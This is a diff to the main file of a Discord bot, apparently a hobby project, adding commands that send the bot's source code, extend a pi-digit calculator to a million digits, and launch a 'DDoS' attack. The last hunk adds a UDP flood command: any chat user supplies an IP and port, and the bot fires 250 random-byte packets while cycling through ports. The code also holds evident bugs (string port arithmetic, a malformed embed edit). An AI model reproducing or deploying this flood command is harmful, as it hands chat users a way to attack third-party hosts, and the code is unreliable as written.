@@ -1,5 +1,5 @@
 '''
-Copyright (c) 2021 Kiet Pham <kiet.riley2005@gmail.com>
+Copyright (c) 2022 Kiet Pham <kiet.riley2005@gmail.com>
 This software/program has a copyright license, more information is in the 'LICENSE' file
 IF YOU WANT TO USE/COPY/MODIFY/REPRODUCE/RE-DISTRIBUTE THIS PROGRAM, YOU MUST INCLUDE A COPY OF THE LICENSE
 
@@ -8,13 +8,16 @@ Author Contact: kiet.riley2005@gmail.com
 Discord: CaptainVietnam6#9842
 Discord Server: https://discord.gg/3z76p8H5yj
 GitHub: https://github.com/CaptainVietnam6
-Instagram: @itz_kietttttttttt
-Program Status: ACTIVE - BETA
+Instagram: @itzkiettttt_fpv
+Program Status: ACTIVE - IN DEVELOPMENT
 '''
-
 '''
 just an important note; this bot is comepletely based of CV6 due to time constraits. some code and sections have been modified.
 '''
+
+#File      Path: /home/runner/MagmaBot/main.py
+#Directory Path: /home/runner/MagmaBot
+
 
 #imports related to discord or discord packages
 import discord
@@ -42,6 +45,9 @@ import json
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import numpy
+import pathlib
+from pathlib import Path
+import socket as sct
 
 
 #imports from other files
@@ -49,7 +55,6 @@ from keep_alive import keep_alive
 from BOT_TOKEN import BOT_TOKEN
 bot_email_password = os.environ['bot_email_password']
 discord_invite_link = os.environ['discord_inv_link']
-
 
 
 '''REFER TO NOTES TO UNDERSTAND CODE BETTER AND USE IT AS A INDEX TO SEE WHERE CERTAIN COMMAND CLASSES ARE'''
@@ -94,7 +99,6 @@ async def reload(ctx, extension):
 for filename in os.listdir("./cogs"):
     if filename.endswith(".py"):
         client.load_extension(f"cogs.{filename[:-3]}")
-
 
 
 #LOADS JISHAKU LIBRARY
@@ -590,6 +594,12 @@ async def _sendbotgithub(ctx):
     await ctx.send("Sending the bot's GitHub repository!")
     await asyncio.sleep(float(0.5))
     await ctx.reply("https://github.com/CaptainVietnam6/MagmaBot")
+
+
+#SEND BOT'S MAIN.PY CODE FILE
+@client.command(aliases = ["sendcode", "Sendcode", "SendCode"])
+async def _sendbotcode(ctx):
+    await ctx.reply(file = discord.File(r"/home/runner/MagmaBot/main.py"))
 
 
 #MEMBER ID GET
@@ -1792,43 +1802,53 @@ async def _pi_digits_calc(ctx, pi_digits):
     decimal_places = DIGITS - 1
     author_name = ctx.author.display_name
 
-    if DIGITS > 0 and DIGITS <= 2000:
+    if DIGITS < 1000000:
         def pi_digits(x):
             #Generate x digits of Pi
             k, a, b, a1, b1 = 2, 4, 1, 12, 4
             while x > 0:
-                p , q, k = k * k, 2 * k + 1, k + 1
+                p, q, k = k * k, 2 * k + 1, k + 1
                 a, b, a1, b1 = a1, b1, p * a + q * a1, p * b + q * b1
-                d,d1 = a/b, a1/b1
+                d, d1 = a/b, a1/b1
 
                 while d == d1 and x > 0:
                     yield int(d)
                     x -= 1
                     a, a1 = 10 * (a % b), 10 * (a1 % b1)
                     d, d1 = a/b, a1/b1
-
+        
         digits = [str(n) for n in list(pi_digits(DIGITS))]
         pi_output = "%s.%s\n" % (digits.pop(0), "".join(digits))
-
-        embed = discord.Embed(
-            title = f"Pi to the {decimal_places}th decimal place (or {DIGITS} digits)",
-            description = f"{pi_output}",
-            color = bot_color
-        )
-        embed.set_footer(text = f"Requested by {author_name}")
+    
+        if DIGITS > 0 and DIGITS <= 2000:
+            embed = discord.Embed(
+                title = f"Pi to the {decimal_places}th decimal place (or {DIGITS} digits)",
+                description = f"{pi_output}",
+                color = bot_color
+            )
+            embed.set_footer(text = f"Requested by {author_name}")
+            
+            print(f"Someone used the Pi calculator command to {DIGITS} digits")
+            await ctx.send(f"Calculating Pi to {DIGITS} digits...")
+            await asyncio.sleep(float(0.5))
+            await ctx.reply(embed = embed)
         
-        print(f"Someone used the Pi calculator command to {DIGITS} digits")
-        await ctx.send(f"Calculating Pi to {DIGITS} digits...")
-        await asyncio.sleep(float(0.5))
-        await ctx.reply(embed = embed)
-    
-    elif DIGITS < 0:
-        print("Pi calculator error: requested digits under 0")
-        await ctx.reply("Error: requested digits cannot be under 0 or be negative")
-    
-    elif DIGITS > 2000:
-        print("Pi calculator error: requested digits over 2000")
-        await ctx.reply("Error: requested digits cannot be over 2000 (this is to reduce calculation times and load on server)")
+        elif DIGITS < 0:
+            print("Pi calculator error: requested digits under 0")
+            await ctx.reply("Error: requested digits cannot be under 0 or be negative")
+        
+        elif DIGITS > 2000:
+            print("Warning: requested digits cannot be over 2000 for a discord embed.\nReturning a .txt file containing digits")
+            await ctx.reply("Warning: requested digits cannot be over 2000 for a discord embed.\n**Returning a .txt file containing digits**")
+
+            file = open(f"pi_calc_output_{DIGITS}_digits.txt", "w")
+            file.write(pi_output)
+            shutil.move(f"/home/runner/MagmaBot/pi_calc_output_{DIGITS}_digits.txt", f"/home/runner/MagmaBot/generated_files/pi_calc_output_{DIGITS}_digits.txt")
+            await ctx.send(file = discord.File(rf"/home/runner/MagmaBot/generated_files/pi_calc_output_{DIGITS}_digits.txt"))
+            os.remove(f"/home/runner/MagmaBot/generated_files/pi_calc_output_{DIGITS}_digits.txt")
+
+    else:
+        await ctx.reply("Requested digits over 1,000,000 (one million). The command will return a text file if the requested number is over 2000 but under 1,000,000 digits. If under 2000, it will send as a discord embed message.")
 
 
 #CACLULATE TAXES
@@ -2096,6 +2116,34 @@ async def _decrypt_message(ctx, *, user_input):
     await ctx.message.delete()
     await asyncio.sleep(float(0.5))
     await ctx.send(embed = embed)
+
+
+#DDOS COMMAND
+@client.command(pass_context = True, aliases = ["ddos", "DDos", "DDOS"])
+async def _DDoS_attack(ctx, ip, port, hold_time):
+    socket = sct.socket(sct.AF_INET, sct.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    sent = 0
+
+    embed = discord.Embed(
+        title = "**MagmaBot DDoS Tool**",
+        description = f"DDoS attack started against target\nIP: **{str(ip)}**\nPort: **{str(port)}**",
+        color = bot_color
+    )
+    embed.set_footer(text = f"Requested by {ctx.author.display_name}, Attacks sent: {sent}")
+    await ctx.reply(embed = embed)
+
+    while sent < 250:
+        socket.sendto(bytes, (ip, port))
+        sent += 1
+        port += 1
+        if port == 65534:
+            port = 1
+
+        upt_embed = embed
+        upt_embed.set_footer(text = f"Requested by {ctx.author.display_name}, Attacks sent: {sent}")
+        print(f"Sent %s packet to %s throught port:%s"%(sent,ip,port))
+        await ctx.reply(embed = embed).edit(upt_embed)
 
 
 #BELOW HERE IS THE ALWAYS ACTIVE CLIENT.LISTEN AND ON_MESSAGE COMMANDS
